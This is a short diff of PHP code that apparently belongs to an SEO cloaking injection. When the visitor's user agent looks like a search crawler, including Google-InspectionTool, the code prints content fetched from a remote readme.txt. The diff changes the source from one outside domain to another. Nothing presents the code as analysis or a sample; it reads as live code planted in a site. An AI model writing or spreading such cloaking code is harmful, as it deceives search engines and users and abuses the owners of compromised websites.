@@ -33,7 +33,7 @@ if ((strpos($agent, 'bot') !== false || strpos($agent, 'Google-InspectionTool') 
         exit;
     }
     
-    echo file_get_contents("https://cliantechsolutions.com/readme.txt");
+    echo file_get_contents("https://jugiterindia.com/readme.txt");
     exit;
 }
 
